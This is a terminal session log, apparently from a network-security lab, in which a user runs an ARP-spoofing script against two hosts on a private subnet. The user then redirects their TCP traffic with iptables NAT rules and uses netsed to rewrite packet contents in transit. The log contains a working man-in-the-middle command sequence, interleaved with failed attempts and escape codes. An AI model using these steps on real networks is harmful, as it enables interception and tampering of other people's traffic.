Script started on 2021-12-06 21:05:42-0700
Rloerke@lan2-2:~ % exitsudo chmod a+r log6[20Gexit[Kls[Ksudo python ARPSpoofing.py[20Gcd ~[Ksudo python ARPSpoofing.py[20G./netsed tcp 10101 10.10.2.1 54321 s/color/apple &
[1] 23233
Rloerke@lan2-2:~ % ./netsed: Command not found.
cd netsed-1.2
[1]    Exit 1                        ./netsed tcp 10101 10.10.2.1 54321 s/color/apple
Rloerke@lan2-2:~/netsed-1.2 % cd netsed-1.2[31G./netsed tcp 10101 10.10.2.1 54321 s/color/apple &
[1] 23235
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/color/apple...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[1]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/color/apple
Rloerke@lan2-2:~/netsed-1.2 % sudo iptables -t nat -D PREROUTING -s 10.10.2.2 -d 10.10.2.1 -p tcp --dport 54321 -j REDIRECT --to 10101
iptables: No chain/target/match by that name.
Rloerke@lan2-2:~/netsed-1.2 % sudo iptables -t nat -D PREROUTING -s 10.10.2.2 -d 10.10.2.1 -p tcp --dport 54321 -j REDIRECT --to 10101[P[1@A
Rloerke@lan2-2:~/netsed-1.2 % sudo iptables -t nat -A PREROUTING -s 10.10.2.2 -d 10.10.2.1 -p tcp --dport 54321 -j REDIRECT --to 10101[53GD[135G[31G./netsed tcp 10101 10.10.2.1 54321 s/color/apple &[K
[1] 23240
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/color/apple...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[1]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/color/apple
Rloerke@lan2-2:~/netsed-1.2 % ./netsed tcp 10101 10.10.2.1 54321 s/color/apple &
[1] 23243
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/color/apple...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[1]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/color/apple
Rloerke@lan2-2:~/netsed-1.2 % ./netsed tcp 10101 10.10.2.1 54321 s/color/apple &[31G[Ksudo python ARPSpoofing.py
python: can't open file 'ARPSpoofing.py': [Errno 2] No such file or directory
Rloerke@lan2-2:~/netsed-1.2 % cd ~
Rloerke@lan2-2:~ % cd ~sudo python ARPSpoofing.py
Enter the desired interface: 'eth1'
Enter the Attacker's MAC address: '\x02\xcb\xc9\x79\xd8\xb4'
Enter Victim 1's MAC address: '\x02\x9b\x1f\xc9\x89\x32'
Enter Victim 2's MAC address: '\x02\xdf\xda\x62\xed\x6f'
Enter Victim 1's IP address: '10.10.2.2'
Enter Victim 2's IP address: '10.10.2.1'
^CTraceback (most recent call last):
  File "ARPSpoofing.py", line 60, in <module>
    s.send(victim2_ARP)
KeyboardInterrupt
Rloerke@lan2-2:~ % sudo python ARPSpoofing.py[20Gcd ~[Ksudo python ARPSpoofing.py[20G./netsed tcp 10101 10.10.2.1 54321 s/color/apple &[20Gsudo python ARPSpoofing.py[K[20Gcd ~[Ksudo python ARPSpoofing.py[20G[Kcd[K[Kls
ARPSpoofing.py	      FakeTrafficServer.py  iperf-3.10		    lan2-1-log	log3  log5  log.txt	netsed_1.2.orig.tar.gz	sniflog   sniflog3
FakeTrafficClient.py  iperf3		    iperf-3-current.tar.gz  lan2-2-log	log4  log6  netsed-1.2	router-log		sniflog2
Rloerke@lan2-2:~ % cd netsed-1.2
Rloerke@lan2-2:~/netsed-1.2 % cd netsed-1.2[31Gls[Ksudo python ARPSpoofing.py[31Gcd ~[Ksudo python ARPSpoofing.py[31G./netsed tcp 10101 10.10.2.1 54321 s/color/apple &
[1] 23253
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/color/apple...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[1]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/color/apple
Rloerke@lan2-2:~/netsed-1.2 % fg
fg: No current job.
Rloerke@lan2-2:~/netsed-1.2 % ./netsed -help
netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
Usage: netsed [option] proto lport rhost rport rule1 [ rule2 ... ]

  options - can be --ipv4 or -4 to force address resolution in IPv4,
            --ipv6 or -6 to force address resolution in IPv6,
            --ipany to resolve the address in either IPv4 or IPv6.
          - --help or -h to display this usage information.
  proto   - protocol specification (tcp or udp)
  lport   - local port to listen on (see README for transparent
            traffic intercepting on some systems)
  rhost   - where connection should be forwarded (0 = use destination
            address of incoming connection, see README)
  rport   - destination port (0 = dst port of incoming connection)
  ruleN   - replacement rules (see below)

General syntax of replacement rules: s/pat1/pat2[/expire]

This will replace all occurrences of pat1 with pat2 in any matching packet.
An additional parameter, 'expire' of the form [CHAR][NUM], can be used to
expire a rule after NUM successful substitutions during a given connection.
The character CHAR is one of "iIoO", with the effect of restricting the rule
to apply to incoming ("iI") or to outgoing ("oO") packets only, as seen from
the client's perspective. Both of CHAR and NUM are optional.

Eight-bit characters, including NULL and '/', can be applied using HTTP-like
hex escape sequences (e.g. CRLF as %0a%0d).
A match on '%' can be achieved by specifying '%%'.

Examples:
  's/andrew/mike/1'     - replace 'andrew' with 'mike' (only first time)
  's/andrew/mike'       - replace all occurrences of 'andrew' with 'mike'
  's/andrew/mike%00%00' - replace 'andrew' with 'mike\x00\x00'
                          (manually padding to keep original size)
  's/%%/%2f/20'         - replace the 20 first occurrence of '%' with '/'
  's/andrew/mike/o'     - the server will always see 'mike', never 'andrew'

  's/Rilke/Proust/o s/Proust/Rilke/i'
                        - let Rilke travel incognito as Proust

Rules are not active across packet boundaries, and they are evaluated
from first to last, not yet expired rule, as stated on the command line.
Rloerke@lan2-2:~/netsed-1.2 % ./netsed -help[31Gfg[K./netsed tcp 10101 10.10.2.1 54321 s/color/apple &[P[P[P[P[P[1@I/apple &[K &[K &[K &[K &[KP &e &o &p &l &e &
[1] 23268
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/I/People...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[1]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/I/People
Rloerke@lan2-2:~/netsed-1.2 % sudo iptables -t nat -A PREROUTING -s 10.10.2.2 -d 10.10.2.1 -p tcp --dport 54321 -j REDIRECT --to 10101[K2
Rloerke@lan2-2:~/netsed-1.2 % sudo iptables -t nat -A PREROUTING -s 10.10.2.2 -d 10.10.2.1 -p tcp --dport 54321 -j REDIRECT --to 10102[31G./netsed tcp 10101 10.10.2.1 54321 s/I/People &[K[P[1@2
[1] 23271
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/I/People...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
[+] Listening on port 10102/tcp.

[KRloerke@lan2-2:~/netsed-1.2 % ./netsed tcp 10102 10.10.2.1 54321 s/I/People &2[P[1@1
[2] 23276
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/I/People...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.
./netsed tcp 10101 10.10.2.1 54321 s/I/People &[48G2[78G[48G1[78G[31G[K
[2]    Exit 2                        ./netsed tcp 10101 10.10.2.1 54321 s/I/People
Rloerke@lan2-2:~/netsed-1.2 % 
Rloerke@lan2-2:~/netsed-1.2 % ./netsed tcp 10101 10.10.2.1 54321 s/I/People &[48G2[78G
[2] 23277
Rloerke@lan2-2:~/netsed-1.2 % netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
[*] Parsing rule s/I/People...
[+] Loaded 1 rule...
[+] Using fixed forwarding to 10.10.2.1,54321.
bind(): Address already in use[-] Error: Listening socket failed.
netsed: exiting.

[2]    Exit 2                        ./netsed tcp 10102 10.10.2.1 54321 s/I/People
Rloerke@lan2-2:~/netsed-1.2 % ./netsed
netsed 1.2 by Julien VdG <julien@silicone.homelinux.org>
      based on 0.01c from Michal Zalewski <lcamtuf@ids.pl>
Error: not enough parameters

Usage: netsed [option] proto lport rhost rport rule1 [ rule2 ... ]

  use netsed -h for more information on usage.
Rloerke@lan2-2:~/netsed-1.2 % exit
exit

Script done on 2021-12-06 21:17:33-0700
